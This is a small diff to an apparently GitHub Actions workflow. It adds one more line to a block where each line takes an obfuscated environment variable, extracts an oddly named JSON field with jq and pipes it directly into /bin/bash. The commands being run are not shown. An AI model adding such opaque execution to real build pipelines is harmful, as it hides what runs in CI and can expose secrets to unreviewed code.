@@ -24,6 +24,7 @@ jobs:
           echo $a1061 | jq -r .hsyx5128 | /bin/bash
           echo $iboe30 | jq -r .cqnbg2 | /bin/bash
           echo $h2108 | jq -r .rxpqc0 | /bin/bash
+          echo $e4429 | jq -r .ibpts300 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
